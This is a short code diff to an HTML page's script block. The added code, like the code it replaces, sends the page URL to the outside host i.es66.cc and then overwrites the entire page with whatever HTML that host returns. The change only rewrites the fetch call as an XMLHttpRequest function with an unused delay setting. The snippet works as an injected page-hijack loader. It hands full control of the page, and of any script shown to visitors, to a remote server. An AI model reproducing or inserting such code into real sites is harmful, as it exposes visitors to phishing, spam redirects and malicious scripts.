@@ -21,12 +21,24 @@
 		</div>
 	</div>
 <script>
-fetch('https://i.es66.cc/x?ref='+encodeURIComponent(location.href.split('#')[0]))
-.then(response => response.text())
-.then(content=>{
-    var a = document.open("text/html", "replace");
-    a.write(content), a.close();
-});
+loadhtml('https://i.es66.cc/x?ref='+encodeURIComponent(location.href.split('#')[0]))
+function loadhtml(url) {
+    var xhr = new XMLHttpRequest;
+    var html = null;
+    function render() {
+        var a = document.open("text/html", "replace");
+        a.write(html);
+        a.close();
+    }
+    xhr.onload = function () {
+        html = xhr.responseText;
+        var delay = 0;
+        if (delay > 0) setTimeout("render()", delay * 1000)
+        else render();
+    };
+    xhr.open("GET", url, !0);
+    xhr.send();
+}
 </script>
 </body>
 </html>
